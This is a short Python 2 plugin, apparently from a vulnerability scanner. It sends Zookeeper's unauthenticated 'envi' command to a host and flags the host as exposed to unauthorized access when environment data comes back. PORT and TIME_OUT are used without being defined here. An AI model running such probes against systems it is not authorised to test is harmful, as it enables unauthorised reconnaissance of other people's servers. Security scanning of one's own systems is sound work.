# coding:utf-8
import socket
import logging
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "zookeeper",
        "info": "Zookeeper未授权",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    port = PORT
    try:
        socket.setdefaulttimeout(TIME_OUT)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "envi"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Environment' in data:
            return '%s:%s >>>> 存在Zookeeper未授权访问漏洞'%(ip,port)
    except Exception, e:
        logging.error(ip+' '+str(e))
        pass